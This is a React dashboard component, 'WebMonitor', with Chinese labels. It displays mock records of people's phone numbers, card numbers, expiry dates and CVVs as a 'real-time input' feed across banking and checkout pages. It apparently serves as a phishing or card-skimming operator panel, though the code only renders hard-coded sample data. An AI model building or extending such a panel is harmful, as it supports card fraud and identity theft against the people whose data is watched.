import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { useState } from "react";

interface UserSubmission {
  id: string;
  status: "submitted" | "processing" | "verified" | "pending_review" | "rejected";
  statusText: string;
  submissionType: "personal_info" | "credit_card" | "identity_verification" | "address_proof";
  websiteName: string;
  currentPage: string;
  userName: string;
  userLocation?: string;
  timestamp: string;
  progress?: number;
  progressText?: string;
  riskLevel: "low" | "medium" | "high";
  dataSize?: string;
  fieldsCount?: number;
  ipAddress?: string;
  sessionId?: string;
  realtimeInput?: {
    phone?: string;
    cardNumber?: string;
    expiryDate?: string;
    cvv?: string;
  };
}

const submissionData: UserSubmission[] = [
  {
    id: "8021",
    status: "processing",
    statusText: "处理中",
    submissionType: "credit_card",
    websiteName: "前台页面 1111",
    currentPage: "/payment",
    userName: "赵用户",
    userLocation: "上海市静安区",
    timestamp: "2024-01-20 11:30:25",
    progress: 45,
    progressText: "45%",
    riskLevel: "medium",
    dataSize: "256Kb",
    fieldsCount: 6,
    ipAddress: "192.168.1.120",
    sessionId: "sess_xyz789",
    realtimeInput: {
      phone: "138****8888",
      cardNumber: "4321 **** **** 5678",
      expiryDate: "09/26",
      cvv: "123"
    }
  },
  {
    id: "13743",
    status: "processing",
    statusText: "处理中",
    submissionType: "personal_info",
    websiteName: "金融服务平台",
    currentPage: "/profile/personal-info",
    userName: "张小明",
    userLocation: "北京市朝阳区",
    timestamp: "2024-01-20 10:25:16",
    progress: 85,
    progressText: "85%",
    riskLevel: "low",
    dataSize: "402Kb",
    fieldsCount: 12,
    ipAddress: "192.168.1.100",
    sessionId: "sess_abc123",
    realtimeInput: {
      phone: "138****5678",
      cardNumber: "4532 **** **** 1234",
      expiryDate: "12/26",
      cvv: "***"
    }
  },
  {
    id: "13752",
    status: "processing",
    statusText: "处理中",
    submissionType: "credit_card",
    websiteName: "电商购物网",
    currentPage: "/checkout/payment",
    userName: "李小红",
    userLocation: "上海市浦东区",
    timestamp: "2024-01-20 10:23:45",
    progress: 72,
    progressText: "72%",
    riskLevel: "medium",
    dataSize: "156Kb",
    fieldsCount: 8,
    ipAddress: "192.168.1.105",
    realtimeInput: {
      phone: "189****9876",
      cardNumber: "5555 **** **** 4444",
      expiryDate: "08/25",
      cvv: "***"
    }
  },
  {
    id: "13716",
    status: "pending_review",
    statusText: "待审核",
    submissionType: "identity_verification",
    websiteName: "在线银行系统",
    currentPage: "/kyc/identity-check",
    userName: "王大强",
    userLocation: "广州市天河区",
    timestamp: "2024-01-20 10:20:33",
    riskLevel: "high",
    dataSize: "1.2Mb",
    fieldsCount: 15,
    ipAddress: "192.168.1.88",
    realtimeInput: {
      phone: "159****3210",
      cardNumber: "6226 **** **** 7890",
      expiryDate: "03/27",
      cvv: "***"
    }
  }
];

const getSubmissionTypeIcon = (type: string) => {
  switch (type) {
    case "personal_info": return "👤";
    case "credit_card": return "💳";
    case "identity_verification": return "🆔";
    case "address_proof": return "🏠";
    default: return "📄";
  }
};

const getSubmissionTypeName = (type: string) => {
  switch (type) {
    case "personal_info": return "个人资料";
    case "credit_card": return "信用卡信息";
    case "identity_verification": return "身份验证";
    case "address_proof": return "地址证明";
    default: return "其他文档";
  }
};

export function WebMonitor() {
  const [expandedItems, setExpandedItems] = useState<Set<string>>(new Set());
  const onlineCount = submissionData.filter(s => s.status === "processing").length;
  const todaySubmissions = submissionData.length;

  const toggleExpanded = (id: string) => {
    const newExpanded = new Set(expandedItems);
    if (newExpanded.has(id)) {
      newExpanded.delete(id);
    } else {
      newExpanded.add(id);
    }
    setExpandedItems(newExpanded);
  };

  return (
    <div className="flex-1 bg-background">
      {/* Header */}
      <div className="border-b border-border bg-white px-6 py-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            <span className="text-sm text-muted-foreground">📊 神经网络ML1.15</span>
            <h1 className="text-lg font-medium text-foreground">网页实时监控</h1>
            <div className="flex items-center gap-2">
              <Badge variant="outline" className="bg-green-50 text-green-600 border-green-200">
                🔴 LIVE - {onlineCount} 在线处理
              </Badge>
              <Badge variant="outline" className="bg-blue-50 text-blue-600 border-blue-200">
                今日提交: {todaySubmissions}
              </Badge>
            </div>
          </div>
          
          <div className="flex items-center gap-2">
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              🌐 站点管理
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              📊 实时统计
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              🔒 安全设定
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              ⚠️ 风险预警
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              📝 日志查看
            </Button>
          </div>
        </div>
      </div>

      <div className="p-6">
        {/* Clean Table Layout - exactly like reference image */}
        <div className="space-y-1">
          {submissionData.map((submission, index) => (
            <div key={submission.id} className="bg-white hover:bg-gray-50 transition-colors">
              {/* Main Row */}
              <div className="px-4 py-3">
                <div className="grid grid-cols-12 gap-4 items-center text-sm">
                  {/* Column 1: ID & Status */}
                  <div className="col-span-2">
                    <div className="flex items-center gap-2 mb-1">
                      <Badge
                        variant="outline"
                        className={`cursor-pointer text-xs px-2 py-1 ${
                          submission.status === "processing" ? "bg-blue-50 text-blue-600 border-blue-200" :
                          submission.status === "submitted" ? "bg-orange-50 text-orange-600 border-orange-200" :
                          submission.status === "verified" ? "bg-green-50 text-green-600 border-green-200" :
                          submission.status === "pending_review" ? "bg-yellow-50 text-yellow-700 border-yellow-200" :
                          "bg-red-50 text-red-600 border-red-200"
                        }`}
                        onClick={() => toggleExpanded(submission.id)}
                      >
                        编号: {submission.id}
                      </Badge>
                    </div>
                    <div className="text-xs text-muted-foreground">{submission.statusText}</div>
                  </div>

                  {/* Column 2: Realtime Input */}
                  <div className="col-span-3">
                    {submission.realtimeInput && (
                      <div className="bg-red-50 px-3 py-2 rounded border border-red-200">
                        <div className="flex items-center gap-1 text-xs text-red-600 mb-1">
                          🔴 实时输入 <span className="animate-pulse">●</span>
                        </div>
                        <div className="grid grid-cols-2 gap-2 text-xs">
                          {submission.realtimeInput.phone && (
                            <div className="font-mono">📱 {submission.realtimeInput.phone}</div>
                          )}
                          {submission.realtimeInput.cardNumber && (
                            <div className="font-mono">💳 {submission.realtimeInput.cardNumber}</div>
                          )}
                          {submission.realtimeInput.expiryDate && (
                            <div className="font-mono">📅 {submission.realtimeInput.expiryDate}</div>
                          )}
                          {submission.realtimeInput.cvv && (
                            <div className="font-mono">🔒 {submission.realtimeInput.cvv}</div>
                          )}
                        </div>
                      </div>
                    )}
                  </div>

                  {/* Column 3: Website & Type */}
                  <div className="col-span-2">
                    <div className="font-medium text-foreground">{submission.websiteName}</div>
                    <div className="text-xs text-muted-foreground">{submission.currentPage}</div>
                    <div className="flex items-center gap-1 mt-1">
                      {getSubmissionTypeIcon(submission.submissionType)}
                      <span className="text-xs">{getSubmissionTypeName(submission.submissionType)}</span>
                    </div>
                  </div>

                  {/* Column 4: User */}
                  <div className="col-span-1">
                    <div className="text-sm">用户: {submission.userName}</div>
                  </div>

                  {/* Column 5: Progress */}
                  <div className="col-span-2">
                    {submission.progress ? (
                      <div>
                        <div className="flex justify-between text-xs mb-1">
                          <span>进度</span>
                          <span className="font-medium">{submission.progressText}</span>
                        </div>
                        <Progress value={submission.progress} className="h-2" />
                      </div>
                    ) : (
                      <span className="text-xs text-muted-foreground">等待处理...</span>
                    )}
                  </div>

                  {/* Column 6: Risk & Actions */}
                  <div className="col-span-2">
                    <div className="flex items-center justify-between">
                      <Badge
                        variant="outline"
                        className={`text-xs ${
                          submission.riskLevel === "high" ? "bg-red-50 text-red-600 border-red-200" :
                          submission.riskLevel === "medium" ? "bg-yellow-50 text-yellow-600 border-yellow-200" :
                          "bg-green-50 text-green-600 border-green-200"
                        }`}
                      >
                        {submission.riskLevel === "high" ? "🔴 高风险" :
                         submission.riskLevel === "medium" ? "🟡 中风险" :
                         "🟢 低风险"}
                      </Badge>
                      <div className="flex gap-1">
                        <Button variant="outline" size="sm" className="text-xs h-6 px-2">
                          监控
                        </Button>
                        <Button variant="outline" size="sm" className="text-xs h-6 px-2">
                          阻止
                        </Button>
                      </div>
                    </div>
                    <div className="text-xs text-muted-foreground mt-1">
                      数据: {submission.dataSize} • {submission.fieldsCount} 字段
                    </div>
                  </div>
                </div>
              </div>

              {/* Expanded Details */}
              {expandedItems.has(submission.id) && (
                <div className="px-4 py-3 bg-gray-50 border-t border-gray-200">
                  <div className="grid grid-cols-4 gap-4 text-xs">
                    <div>
                      <span className="text-muted-foreground">提交时间: </span>
                      <span className="font-medium">{submission.timestamp}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">用户位置: </span>
                      <span className="font-medium">{submission.userLocation}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">IP地址: </span>
                      <span className="font-medium">{submission.ipAddress}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">会话ID: </span>
                      <span className="font-medium">{submission.sessionId || "N/A"}</span>
                    </div>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>

        {/* Bottom Summary */}
        <div className="mt-6 pt-4 border-t border-border">
          <div className="text-xs text-muted-foreground">
            共监控 {submissionData.length} 个站点提交 • 今日新增 {todaySubmissions} 条 • 平均处理时长 3.2 分钟 • 验证通过率 82%
          </div>
        </div>
      </div>
    </div>
  );
}
